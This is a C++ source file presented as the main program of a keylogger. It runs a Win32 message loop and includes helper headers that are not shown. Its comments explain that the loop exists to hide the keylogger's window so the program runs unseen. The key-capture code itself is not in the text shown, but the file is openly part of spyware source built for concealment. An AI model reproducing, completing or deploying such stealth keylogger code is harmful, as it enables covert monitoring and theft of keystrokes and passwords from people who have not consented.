/**************************************************************************************/
/* ---------------------- THE MAIN PROGRAM OF THE KEYLOGGER ------------------------- */
/* ---------------------			GURPREET SINGH			 ------------------------ */

#include<iostream>
#include<windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"


int main() {
	
	MSG Msg;	//this is a message which is to be processed, but it will never be processed
	
	while(GetMessage (&Msg, NULL, 0, 0)) {
		TranslateMessage(&Msg);	/*this will take message from our program, that is intended for a certain window in our windows,
								and then will modify that particular message, with the Msg( a sort of command that is passed to the particular window -getM
								and DispatchMessage will forward that message to the window*/
		DispatchMessage(&Msg);	/*But this messsage forwarding will never happen, so we are doing this in a much dirty manner, creating a hybrid
								form of win32 console application but it will not actually have a console window */
	}
	return 0;
}


/*
1. MSG part is for masking the keylogger window so that it doesn't appear when we run it, hence our keylogger remains hidden




*/